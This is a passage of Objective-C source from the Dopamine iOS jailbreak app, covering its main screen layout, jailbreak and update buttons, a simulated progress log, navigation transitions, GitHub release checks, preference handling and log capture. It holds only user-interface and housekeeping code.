    [stackView setDistribution:UIStackViewDistributionEqualSpacing];
    [stackView setTranslatesAutoresizingMaskIntoConstraints:NO];

    [self.view addSubview:stackView];


    int statusBarHeight = fmax(15, [[UIApplication sharedApplication] keyWindow].safeAreaInsets.top - 20);

    [NSLayoutConstraint activateConstraints:@[
        [stackView.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor constant:statusBarHeight],//-35
        [stackView.heightAnchor constraintEqualToAnchor:self.view.heightAnchor multiplier:[DOGlobalAppearance isHomeButtonDevice] ? 0.78 : 0.73]
    ]];

    if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPad)
    {
        NSLayoutConstraint *relativeWidthConstraint = [stackView.widthAnchor constraintEqualToAnchor:self.view.widthAnchor multiplier:0.8];
        relativeWidthConstraint.priority = UILayoutPriorityDefaultHigh;
        NSLayoutConstraint *maxWidthConstraint = [stackView.widthAnchor constraintLessThanOrEqualToConstant:UI_IPAD_MAX_WIDTH];
        maxWidthConstraint.priority = UILayoutPriorityRequired;

        [NSLayoutConstraint activateConstraints:@[
            relativeWidthConstraint,
            maxWidthConstraint,
            [stackView.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor]
        ]];
    }
    else
    {
        [NSLayoutConstraint activateConstraints:@[
            [stackView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:UI_PADDING],
            [stackView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-UI_PADDING],
        ]];
    }

    //Header
    DOHeaderView *headerView = [[DOHeaderView alloc] initWithImage: [UIImage imageNamed:@"Dopamine"] subtitles: @[
        [DOGlobalAppearance mainSubtitleString:[[DOEnvironmentManager sharedManager] versionSupportString]],
        [DOGlobalAppearance secondarySubtitleString:DOLocalizedString(@"Credits_Made_By")],
    ]];
    
    [stackView addArrangedSubview:headerView];

    [NSLayoutConstraint activateConstraints:@[
        [headerView.leadingAnchor constraintEqualToAnchor:stackView.leadingAnchor constant:5],
        [headerView.trailingAnchor constraintEqualToAnchor:stackView.trailingAnchor]
    ]];
    
    //Action Menu
    DOActionMenuView *actionView = [[DOActionMenuView alloc] initWithActions:@[
        [UIAction actionWithTitle:DOLocalizedString(@"Menu_Settings_Title") image:[UIImage systemImageNamed:@"gearshape" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"settings" handler:^(__kindof UIAction * _Nonnull action) {
            [self.navigationController pushViewController:[[DOSettingsController alloc] init] animated:YES];
        }],
        [UIAction actionWithTitle:DOLocalizedString(@"Menu_Restart_SpringBoard_Title") image:[UIImage systemImageNamed:@"arrow.clockwise" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"respring" handler:^(__kindof UIAction * _Nonnull action) {
            [self fadeToBlack:^{
                [[DOEnvironmentManager sharedManager] respring];
            }];
        }],
        [UIAction actionWithTitle:DOLocalizedString(@"Menu_Reboot_Userspace_Title") image:[UIImage systemImageNamed:@"arrow.clockwise.circle" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"reboot-userspace" handler:^(__kindof UIAction * _Nonnull action) {
            [self fadeToBlack:^{
                [[DOEnvironmentManager sharedManager] rebootUserspace];
            }];
        }],
        [UIAction actionWithTitle:DOLocalizedString(@"Menu_Credits_Title") image:[UIImage systemImageNamed:@"info.circle" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"credits" handler:^(__kindof UIAction * _Nonnull action) {
            [self.navigationController pushViewController:[[DOCreditsViewController alloc] init] animated:YES];
        }]
    ] delegate:self];
    
    [stackView addArrangedSubview: actionView];

    [NSLayoutConstraint activateConstraints:@[
        [actionView.leadingAnchor constraintEqualToAnchor:stackView.leadingAnchor],
        [actionView.trailingAnchor constraintEqualToAnchor:stackView.trailingAnchor],
    ]];
    
    
    UIView *buttonPlaceHolder = [[UIView alloc] init];
    [buttonPlaceHolder setTranslatesAutoresizingMaskIntoConstraints:NO];
    [stackView addArrangedSubview:buttonPlaceHolder];
    [NSLayoutConstraint activateConstraints:@[
        [buttonPlaceHolder.heightAnchor constraintEqualToConstant:60]
    ]];
    
    //Jailbreak Button
    BOOL isJailbroken = [[DOEnvironmentManager sharedManager] isJailbroken];
    BOOL isSupported = [[DOEnvironmentManager sharedManager] isSupported];

    NSString *jailbreakButtonTitle = [self jailbreakButtonTitle];
        
    UIImage *jailbreakButtonImage;
    if (isSupported)
        jailbreakButtonImage = [UIImage systemImageNamed:@"lock.open" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]];
    else
        jailbreakButtonImage = [UIImage systemImageNamed:@"lock.slash" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]];
    
    self.jailbreakBtn = [[DOJailbreakButton alloc] initWithAction: [UIAction actionWithTitle:jailbreakButtonTitle image:jailbreakButtonImage identifier:@"jailbreak" handler:^(__kindof UIAction * _Nonnull action) {
        [actionView hide];
        [self.jailbreakBtn expandButton: self.jailbreakButtonConstraints];

        self.updateButton.userInteractionEnabled = NO;
        [UIView animateWithDuration:0.75 delay:0 usingSpringWithDamping:0.9 initialSpringVelocity:2.0  options: UIViewAnimationOptionCurveEaseInOut animations:^{
            [headerView setTransform:CGAffineTransformMakeTranslation(0, -25)];
            self.updateButton.alpha = 0;
        } completion:nil];
        
        [self startJailbreak];
        
    }]];
    self.jailbreakBtn.enabled = !isJailbroken && isSupported;

    [self.view addSubview:self.jailbreakBtn];

    [NSLayoutConstraint activateConstraints:(self.jailbreakButtonConstraints = @[
        [self.jailbreakBtn.leadingAnchor constraintEqualToAnchor:stackView.leadingAnchor],
        [self.jailbreakBtn.trailingAnchor constraintEqualToAnchor:stackView.trailingAnchor],
        [self.jailbreakBtn.heightAnchor constraintEqualToAnchor:buttonPlaceHolder.heightAnchor],
        [self.jailbreakBtn.centerYAnchor constraintEqualToAnchor:buttonPlaceHolder.centerYAnchor]
    ])];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.1 * NSEC_PER_SEC), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
        if ([[DOUIManager sharedInstance] environmentUpdateAvailable])
        {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self setupUpdateAvailable:YES];
            });
        }
        else if ([[DOUIManager sharedInstance] isUpdateAvailable])
        {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self setupUpdateAvailable:NO];
            });
        }
    });
}

- (NSString *)jailbreakButtonTitle
{
    BOOL isJailbroken = [[DOEnvironmentManager sharedManager] isJailbroken];
    BOOL isSupported = [[DOEnvironmentManager sharedManager] isSupported];
    BOOL removeJailbreakEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"removeJailbreakEnabled" fallback:NO];

    NSString *jailbreakButtonTitle = DOLocalizedString(@"Button_Jailbreak_Title");
    if (!isSupported)
        jailbreakButtonTitle = DOLocalizedString(@"Unsupported");
    else if (isJailbroken)
        jailbreakButtonTitle = DOLocalizedString(@"Status_Title_Jailbroken");
    else if (removeJailbreakEnabled)
        jailbreakButtonTitle = DOLocalizedString(@"Button_Remove_Jailbreak");
    
    return jailbreakButtonTitle;
}

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    [self.jailbreakBtn.button setTitle:[self jailbreakButtonTitle] forState:UIControlStateNormal];
}

- (void)startJailbreak
{
    DOJailbreaker *jailbreaker = [[DOJailbreaker alloc] init];

    [[DOUIManager sharedInstance] startLogCapture];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{

        //We need to get the preconfig mutex to start the jailbreak (self.jailbreakBtn.canStartJailbreak)
        [self.jailbreakBtn lockMutex];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.hideHomeIndicator = YES;
        });

        NSError *error;
        BOOL didRemove = NO;
        BOOL showLogs = YES;
        [jailbreaker runWithError:&error didRemoveJailbreak:&didRemove showLogs:&showLogs];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (error && showLogs) {
                [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Jailbreak failed with error: %@", error] debug:NO];
                [self.navigationController pushViewController:[[DOLogCrashViewController alloc] initWithTitle:[error localizedDescription]] animated:YES];
            }
            else if (error && !showLogs) {
                // Used when there is an error that is explainable in such detail that additional logs are not needed
                UIAlertController *alertController = [UIAlertController alertControllerWithTitle:DOLocalizedString(@"Log_Error") message:[error localizedDescription] preferredStyle:UIAlertControllerStyleAlert];
                UIAlertAction *rebootAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Reboot") style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                    exec_cmd_trusted(JBROOT_PATH("/sbin/reboot"), NULL);
                }];
                [alertController addAction:rebootAction];
                [self presentViewController:alertController animated:YES completion:nil];
            }
            else if (didRemove) {
                UIAlertController *alertController = [UIAlertController alertControllerWithTitle:DOLocalizedString(@"Removed_Jailbreak_Alert_Title") message:DOLocalizedString(@"Removed_Jailbreak_Alert_Message") preferredStyle:UIAlertControllerStyleAlert];
                UIAlertAction *rebootAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Close") style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                    exit(0);
                }];
                [alertController addAction:rebootAction];
                [self presentViewController:alertController animated:YES completion:nil];
            }
            else {
                // No errors
                [[DOUIManager sharedInstance] completeJailbreak];
                [self fadeToBlack: ^{
                    [jailbreaker finalize];
                }];
            }
        });
        [self.jailbreakBtn unlockMutex];
    });
}

-(void)setupUpdateAvailable:(BOOL)environmentUpdate
{
    if (self.jailbreakBtn.didExpand)
        return;

    NSString *title = environmentUpdate ? DOLocalizedString(@"Button_Update_Environment") : DOLocalizedString(@"Button_Update_Available");
    
    NSString *releaseFrom = [[DOUIManager sharedInstance] getLaunchedReleaseTag];
    NSString *releaseTo = [[DOUIManager sharedInstance] getLatestReleaseTag];

    if (environmentUpdate)
    {
        releaseFrom = [[DOEnvironmentManager sharedManager] jailbrokenVersion];
        releaseTo = [[DOUIManager sharedInstance] getLaunchedReleaseTag];
    }

    self.updateButton = [DOActionMenuButton buttonWithAction:[UIAction actionWithTitle:title image:[UIImage systemImageNamed:@"arrow.down.circle" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"update-available" handler:^(__kindof UIAction * _Nonnull action) {
        [self.navigationController pushViewController:[[DOUpdateViewController alloc] initFromTag:releaseFrom toTag:releaseTo] animated:YES];
    }] chevron:NO];

    self.updateButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.updateButton];

    [NSLayoutConstraint activateConstraints:@[
        [self.updateButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.updateButton.heightAnchor constraintEqualToConstant:30],
        [self.updateButton.bottomAnchor constraintEqualToAnchor:self.jailbreakBtn.topAnchor constant:[DOGlobalAppearance isHomeButtonDevice] ? -10 : -20]
    ]];

    [self.updateButton setTransform:CGAffineTransformMakeTranslation(0, 25)];
    [self.updateButton setAlpha:0];
    [UIView animateWithDuration:0.5 delay:0 usingSpringWithDamping:0.9 initialSpringVelocity:2.0  options: UIViewAnimationOptionCurveEaseInOut animations:^{
        [self.updateButton setTransform:CGAffineTransformIdentity];
        [self.updateButton setAlpha:1];
    } completion:nil];
}

-(void)simulateJailbreak
{
    // Let's simulate a "jailbreak" using grand central dispatch

    DOUIManager *uiManager = [DOUIManager sharedInstance];

    static BOOL didFinish = NO; //not thread safe lol
    

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [uiManager completeJailbreak];
        [uiManager sendLog:@"Rebooting Userspace" debug: NO];
        didFinish = YES;
        [self fadeToBlack: ^{

        }];
    });

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [NSThread sleepForTimeInterval:0.2];
        [uiManager sendLog:@"Launching kexploitd" debug: NO];
        [NSThread sleepForTimeInterval:0.5];
        [uiManager sendLog:@"Launching oobPCI" debug: NO];
        [NSThread sleepForTimeInterval:0.15];
        [uiManager sendLog:@"Gaining r/w" debug: NO];
        [NSThread sleepForTimeInterval:0.8];
        [uiManager sendLog:@"Patchfinding" debug: NO];
        NSArray *types = @[@"AMFI", @"PAC", @"KTRR", @"KPP", @"PPL", @"KPF", @"APRR", @"AMCC", @"PAN", @"PXN", @"ASLR", @"OPA"]; //Ever heard of the legendary opa bypass
        while (true)
        {
            [NSThread sleepForTimeInterval:0.6 * rand() / RAND_MAX];
            if (didFinish) break;
            NSString *type = types[arc4random_uniform((uint32_t)types.count)];
            [uiManager sendLog:[NSString stringWithFormat:@"Bypassing %@", type] debug: NO];
        }
    });
}

- (void)fadeToBlack:(void (^)(void))completion
{
    static bool didFade = false;
    if (didFade)
        return;
    didFade = true;
    UIView *mainView = self.parentViewController.view;
    float deviceCornerRadius = [[[UIScreen mainScreen] valueForKey:@"_displayCornerRadius"] floatValue];

    mainView.layer.cornerRadius = deviceCornerRadius;
    mainView.layer.cornerCurve = kCACornerCurveContinuous;
    mainView.layer.masksToBounds = YES;
    
    self.hideStatusBar = YES;

    [UIView animateWithDuration:0.5 delay:0 usingSpringWithDamping:0.9 initialSpringVelocity:2.0 options: UIViewAnimationOptionCurveEaseInOut animations:^{
        mainView.transform = CGAffineTransformMakeScale(0.9, 0.9);
        mainView.alpha = 0.0;
    } completion:^(BOOL success) {
        completion();
    }];
}

#pragma mark - Action Menu Delegate

- (BOOL)actionMenuShowsChevronForAction:(UIAction *)action
{
    if ([action.identifier isEqualToString:@"settings"] || [action.identifier isEqualToString:@"credits"]) return YES;
    return NO;
}

- (BOOL)actionMenuActionIsEnabled:(UIAction *)action
{
    if ([action.identifier isEqualToString:@"respring"] || [action.identifier isEqualToString:@"reboot-userspace"]) {
        return [[DOEnvironmentManager sharedManager] isJailbroken];
    }
    return YES;
}

#pragma mark - Status Bar

- (UIStatusBarStyle)preferredStatusBarStyle
{
    return UIStatusBarStyleLightContent;
}

- (BOOL)prefersStatusBarHidden
{
    return self.hideStatusBar;
}

- (BOOL)prefersHomeIndicatorAutoHidden
{
    return self.hideHomeIndicator;
}

- (void)setHideStatusBar:(BOOL)hideStatusBar
{
    _hideStatusBar = hideStatusBar;
    [self setNeedsStatusBarAppearanceUpdate];
}

- (void)setHideHomeIndicator:(BOOL)hideHomeIndicator
{
    _hideHomeIndicator = hideHomeIndicator;
    [self setNeedsUpdateOfHomeIndicatorAutoHidden];
}

@end

```

`Application/Dopamine/UI/DONavigationController.h`:

```h
//
//  DONavigationController.h
//  Dopamine
//
//  Created by tomt000 on 04/01/2024.
//

#import <UIKit/UIKit.h>
#import "UIImage+Blur.h"
#import "DOMainViewController.h"
#import "Transition/DOModalTransitionScale.h"
#import "Transition/DOModalTransitionPush.h"

NS_ASSUME_NONNULL_BEGIN

@interface DONavigationController : UINavigationController <UINavigationControllerDelegate>

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/DONavigationController.m`:

```m
//
//  DONavigationController.m
//  Dopamine
//
//  Created by tomt000 on 04/01/2024.
//

#import "DONavigationController.h"
#import <objc/runtime.h>
#import "DOModalBackAction.h"
#import "DOGlobalAppearance.h"
#import "DOThemeManager.h"

@interface DONavigationController ()

@property (nonatomic) UIImageView *backgroundImageView;
@property (nonatomic) DOMainViewController *mainView;
@property (nonatomic) DOModalBackAction *backAction;

@end

@interface UINavigationController (Private)
-(CGRect)_frameForViewController:(id)arg1;
@end

@implementation DONavigationController

- (void)viewDidLoad
{
    [self setupBackground];
    [super viewDidLoad];
    [self setNavigationBarHidden:YES];
    [self pushViewController:(self.mainView = [[DOMainViewController alloc] init]) animated:NO];
    [self setDelegate:self];
    [self setOverrideUserInterfaceStyle:UIUserInterfaceStyleDark];
}

- (void)setupBackground
{
    DOTheme *theme = [[DOThemeManager sharedInstance] enabledTheme];
    
    self.view.backgroundColor = [UIColor blackColor];
    self.backgroundImageView = [[UIImageView alloc] init];
    self.backgroundImageView.image = [theme image];
    self.backgroundImageView.contentMode = UIViewContentModeScaleAspectFill;
    self.backgroundImageView.translatesAutoresizingMaskIntoConstraints = NO;
    self.backgroundImageView.userInteractionEnabled = NO;
    self.backgroundImageView.layer.zPosition = -1;

    [self.view insertSubview:self.backgroundImageView atIndex:0];
    
    [NSLayoutConstraint activateConstraints:@[
        [self.backgroundImageView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.backgroundImageView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.backgroundImageView.topAnchor constraintEqualToAnchor:self.view.topAnchor constant:-100],
        [self.backgroundImageView.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor constant:100],
    ]];

    self.backAction = [[DOModalBackAction alloc] initWithAction:^{
        [self popViewControllerAnimated:YES];
    }];
    self.backAction.translatesAutoresizingMaskIntoConstraints = NO;
    self.backAction.hidden = YES;
    
    [self.view insertSubview:self.backAction atIndex:2];
    
    [NSLayoutConstraint activateConstraints:@[
        [self.backAction.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.backAction.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.backAction.topAnchor constraintEqualToAnchor:self.view.topAnchor],
        [self.backAction.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor],
    ]];
}

- (void)setBackgroundDimmed:(BOOL)dimmed
{
    [UIView animateWithDuration:0.3 animations:^{
        self.backgroundImageView.alpha = dimmed ? 0.4 : 1;
    }];
    self.backgroundImageView.userInteractionEnabled = dimmed;
    self.backAction.hidden = !dimmed;
}

#pragma mark - Delegate

- (id<UIViewControllerAnimatedTransitioning>)navigationController:(UINavigationController *)navigationController
           animationControllerForOperation:(UINavigationControllerOperation)operation
                        fromViewController:(UIViewController *)fromVC
                          toViewController:(UIViewController *)toVC {
    
    
    if (fromVC.class == DOMainViewController.class || toVC.class == DOMainViewController.class)
        return [[DOModalTransitionScale alloc] initForwards: operation == UINavigationControllerOperationPush];
    return [[DOModalTransitionPush alloc] initForwards: operation == UINavigationControllerOperationPush];
}

- (void)navigationController:(UINavigationController *)navigationController willShowViewController:(UIViewController *)viewController animated:(BOOL)animated
{
    [self setBackgroundDimmed:![viewController isKindOfClass:[DOMainViewController class]]];
    [self.backAction setIgnoreFrame:[self _frameForViewController:viewController]];
}

#pragma mark - Overrides

-(CGRect)_frameForViewController:(id)viewController
{
    CGRect orig = [super _frameForViewController: viewController];
    if ([[viewController class] isEqual: [DOMainViewController class]])
        return orig;
    
    orig.size.width = fmin(orig.size.width - UI_MODAL_PADDING * 2, UI_IPAD_MAX_WIDTH);
    orig.size.height *= [DOGlobalAppearance isSmallDevice] ? 0.8 : 0.7;
    orig.origin.x = (self.view.frame.size.width - orig.size.width) / 2;
    orig.origin.y = (self.view.frame.size.height - orig.size.height) / 2;

    return orig;

}


@end

```

`Application/Dopamine/UI/DOUIManager.h`:

```h
//
//  DOUIManager.h
//  Dopamine
//
//  Created by tomt000 on 24/01/2024.
//

#import <Foundation/Foundation.h>
#import "DOLogViewProtocol.h"
#import "DODebugLogView.h"
#import "DOPreferenceManager.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOUIManager : NSObject
{
    DOPreferenceManager *_preferenceManager;
    NSDictionary *_fallbackLocalizations;
    NSLock *_logLock;
}

@property (nonatomic, readonly) NSString *bootlogoPath;
@property (nonatomic, retain) NSObject<DOLogViewProtocol> *logView;
@property (atomic, retain) NSMutableArray<NSString*> *logRecord;

+ (instancetype)sharedInstance;

- (BOOL)isDebug;
- (void)sendLog:(NSString*)log debug:(BOOL)debug update:(BOOL)update;
- (void)sendLog:(NSString*)log debug:(BOOL)debug;
- (void)completeJailbreak;
- (void)startLogCapture;
- (void)shareLogRecordFromView:(UIView *)sourceView;
- (BOOL)isUpdateAvailable;
- (BOOL)environmentUpdateAvailable;
- (NSArray *)getLatestReleases;
- (NSString*)getLaunchedReleaseTag;
- (NSString*)getLatestReleaseTag;
- (NSArray *)getUpdatesInRange:(NSString *)start end:(NSString *)end;
- (bool)launchedReleaseNeedsManualUpdate;
- (NSArray*)availablePackageManagers;
- (NSArray*)enabledPackageManagerKeys;
- (NSArray*)enabledPackageManagers;
- (void)resetPackageManagers;
- (void)resetSettings;
- (void)setPackageManager:(NSString*)key enabled:(BOOL)enabled;
- (NSString *)localizedStringForKey:(NSString*)key;
- (UIImage *)renderBootLogo;

@end

NSString *DOLocalizedString(NSString *string);

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/DOUIManager.m`:

```m
//
//  DOUIManager.m
//  Dopamine
//
//  Created by tomt000 on 24/01/2024.
//

#import "DOUIManager.h"
#import "DOEnvironmentManager.h"
#import "DOThemeManager.h"
#import "DOTheme.h"
#import "NSString+Version.h"
#import <pthread.h>

@implementation DOUIManager

+ (instancetype)sharedInstance
{
    static DOUIManager *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[DOUIManager alloc] init];
    });
    return sharedInstance;
}

- (id)init
{
    if (self = [super init]){
        _bootlogoPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/bootlogo.png"];
        _preferenceManager = [DOPreferenceManager sharedManager];
        _logRecord = [NSMutableArray new];
        _logLock = [NSLock new];
    }
    return self;
}

- (BOOL)isUpdateAvailable
{
    NSString *latestVersion = [self getLatestReleaseTag];
    NSString *currentVersion = [self getLaunchedReleaseTag];
    return [latestVersion numericalVersionRepresentation] > [currentVersion numericalVersionRepresentation];
}

- (NSArray *)getUpdatesInRange:(NSString *)start end:(NSString *)end
{
    NSArray *releases = [self getLatestReleases];
    if (releases.count == 0)
        return @[];

    long long startVersion = [start numericalVersionRepresentation];
    long long endVersion = [end numericalVersionRepresentation];
    NSMutableArray *updates = [NSMutableArray new];
    for (NSDictionary *release in releases) {
        NSString *version = release[@"tag_name"];
        NSNumber *prerelease = release[@"prerelease"];
        if ([prerelease boolValue]) {
            // Skip prereleases
            continue;
        }
        long long numericalVersion = [version numericalVersionRepresentation];
        if (numericalVersion > startVersion && numericalVersion <= endVersion) {
            [updates addObject:release];
        }
    }
    return updates;
}

- (NSArray *)getLatestReleases
{
    static dispatch_once_t onceToken;
    static NSArray *releases;
    dispatch_once(&onceToken, ^{
        NSURL *url = [NSURL URLWithString:@"https://api.github.com/repos/opa334/Dopamine/releases"];
        NSData *data = [NSData dataWithContentsOfURL:url];
        if (data) {
            NSError *error;
            releases = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
            if (error)
            {
                onceToken = 0;
                releases = @[];
            }
        }
    });
    return releases;
}

- (BOOL)environmentUpdateAvailable
{
    if (![[DOEnvironmentManager sharedManager] jailbrokenVersion])
        return NO;

    NSString *jailbrokenVersion = [[DOEnvironmentManager sharedManager] jailbrokenVersion];
    NSString *launchedVersion = [self getLaunchedReleaseTag];
    
    return [launchedVersion numericalVersionRepresentation] > [jailbrokenVersion numericalVersionRepresentation];
}

- (bool)launchedReleaseNeedsManualUpdate
{
    NSString *launchedTag = [self getLaunchedReleaseTag];
    NSDictionary *launchedVersion;
    for (NSDictionary *release in [self getLatestReleases]) {
        if ([release[@"tag_name"] isEqualToString:launchedTag]) {
            launchedVersion = release;
            break;
        }
    }
    if (!launchedVersion)
        return false;
    return [launchedVersion[@"body"] containsString:@"*Manual Updates*"];
}

- (NSString*)getLatestReleaseTag
{
    NSArray *releases = [self getLatestReleases];
    for (NSDictionary *release in releases) {
        NSNumber *prerelease = release[@"prerelease"];
        if ([prerelease boolValue]) {
            continue;
        }
        return release[@"tag_name"];
    }
    return nil;
}

- (NSString*)getLaunchedReleaseTag
{
    return [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"];
}

- (NSArray*)availablePackageManagers
{
    NSString *path = [[NSBundle mainBundle] pathForResource:@"PkgManagers" ofType:@"plist"];
    return [NSArray arrayWithContentsOfFile:path];
}

- (NSArray*)enabledPackageManagerKeys
{
    NSArray *enabledPkgManagers = [_preferenceManager preferenceValueForKey:@"enabledPkgManagers"] ?: @[];
    NSMutableArray *enabledKeys = [NSMutableArray new];
    NSArray *availablePkgManagers = [self availablePackageManagers];

    [availablePkgManagers enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        NSString *key = obj[@"Key"];
        if ([enabledPkgManagers containsObject:key]) {
            [enabledKeys addObject:key];
        }
    }];

    return enabledKeys;
}

- (NSArray*)enabledPackageManagers
{
    NSMutableArray *enabledPkgManagers = [NSMutableArray new];
    NSArray *enabledKeys = [self enabledPackageManagerKeys];

    [[self availablePackageManagers] enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        NSString *key = obj[@"Key"];
        if ([enabledKeys containsObject:key]) {
            [enabledPkgManagers addObject:obj];
        }
    }];

    return enabledPkgManagers;
}

- (void)resetPackageManagers
{
    [_preferenceManager removePreferenceValueForKey:@"enabledPkgManagers"];
}

- (void)resetSettings
{
    [_preferenceManager removePreferenceValueForKey:@"verboseLogsEnabled"];
    [_preferenceManager removePreferenceValueForKey:@"tweakInjectionEnabled"];
    [self resetPackageManagers];
}

- (void)setPackageManager:(NSString*)key enabled:(BOOL)enabled
{
    NSMutableArray *pkgManagers = [self enabledPackageManagerKeys].mutableCopy;
    
    if (enabled && ![pkgManagers containsObject:key]) {
        [pkgManagers addObject:key];
    }
    else if (!enabled && [pkgManagers containsObject:key]) {
        [pkgManagers removeObject:key];
    }

    [_preferenceManager setPreferenceValue:pkgManagers forKey:@"enabledPkgManagers"];
}

- (BOOL)isDebug
{
    NSNumber *debug = [_preferenceManager preferenceValueForKey:@"verboseLogsEnabled"];
    return debug == nil ? NO : [debug boolValue];
}

- (BOOL)enableTweaks
{
    NSNumber *tweaks = [_preferenceManager preferenceValueForKey:@"tweakInjectionEnabled"];
    return tweaks == nil ? YES : [tweaks boolValue];
}

- (void)sendLog:(NSString*)log debug:(BOOL)debug update:(BOOL)update
{
    if (!self.logView || !log)
        return;

    [_logLock lock];

    [self.logRecord addObject:log];

    BOOL isDebug = self.logView.class == DODebugLogView.class;
    if (debug && !isDebug) {
        [_logLock unlock];
        return;
    }
        
    
    if (update) {
        if ([self.logView respondsToSelector:@selector(updateLog:)]) {
            [self.logView updateLog:log];
        }
    }
    else {
        [self.logView showLog:log];
    }
    [_logLock unlock];
}

- (void)sendLog:(NSString*)log debug:(BOOL)debug
{
    [self sendLog:log debug:debug update:NO];
}

- (void)shareLogRecordFromView:(UIView *)sourceView
{
    if (self.logRecord.count == 0)
        return;

    NSString *log = [self.logRecord componentsJoinedByString:@"\n"];
    UIActivityViewController *activityViewController = [[UIActivityViewController alloc] initWithActivityItems:@[log] applicationActivities:nil];
    activityViewController.popoverPresentationController.sourceView = sourceView;
    activityViewController.popoverPresentationController.sourceRect = sourceView.bounds;
    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:activityViewController animated:YES completion:nil];
}

- (void)completeJailbreak
{
    if (!self.logView)
        return;

    [self.logView didComplete];
}

- (void)observeFileDescriptor:(int)fd withCallback:(void (^)(char *line))callbackBlock
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        int stdout_pipe[2];
        int stdout_orig[2];
        if (pipe(stdout_pipe) != 0 || pipe(stdout_orig) != 0) {
            return;
        }

        dup2(fd, stdout_orig[1]);
        close(stdout_orig[0]);
        
        dup2(stdout_pipe[1], fd);
        close(stdout_pipe[1]);
        
        char cur = 0;
        char line[1024];
        int line_index = 0;
        ssize_t bytes_read;

        while ((bytes_read = read(stdout_pipe[0], &cur, sizeof(cur))) > 0) {
            @autoreleasepool {
                write(stdout_orig[1], &cur, bytes_read);

                if (cur == '\n') {
                    line[line_index] = '\0';
                    callbackBlock(line);
                    line_index = 0;
                } else {
                    if (line_index < sizeof(line) - 1) {
                        line[line_index++] = cur;
                    }
                }
            }
        }
        close(stdout_pipe[0]);
    });
}

- (void)startLogCapture
{
    [self observeFileDescriptor:STDOUT_FILENO withCallback:^(char *line) {
        NSString *str = [NSString stringWithUTF8String:line];
        [self sendLog:str debug:YES];
    }];
    
    [self observeFileDescriptor:STDERR_FILENO withCallback:^(char *line) {
        NSString *str = [NSString stringWithUTF8String:line];
        [self sendLog:str debug:YES];
    }];
}

- (NSString *)localizedStringForKey:(NSString*)key
{
    NSString *candidate = NSLocalizedString(key, nil);
    if ([candidate isEqualToString:key]) {
        if (!_fallbackLocalizations) {
            _fallbackLocalizations = [NSDictionary dictionaryWithContentsOfFile:[[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"en.lproj/Localizable.strings"]];
        }
        candidate = _fallbackLocalizations[key];
        if (!candidate) candidate = key;
    }
    return candidate;
}

- (UIImage *)renderBootLogo
{
    return [[[DOThemeManager sharedInstance] enabledTheme] generateBootLogo];
}

@end


NSString *DOLocalizedString(NSString *key)
{
    return [[DOUIManager sharedInstance] localizedStringForKey:key];
}

```

`Application/Dopamine/UI/Log/DODebugLogView.h`:

```h
//
//  DODebugLogView.h
//  Dopamine
//
//  Created by tomt000 on 23/01/2024.
//

#import <UIKit/UIKit.h>
#import "DOLogViewProtocol.h"

NS_ASSUME_NONNULL_BEGIN

@interface DODebugLogView : UIView<DOLogViewProtocol>

@property (nonatomic, strong) UITextView *textView;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Log/DODebugLogView.m`:

```m
//
//  DODebugLogView.m
//  Dopamine
//
//  Created by tomt000 on 23/01/2024.
//

#import "DODebugLogView.h"

@implementation DODebugLogView

-(id)init
{
    if (self = [super init])
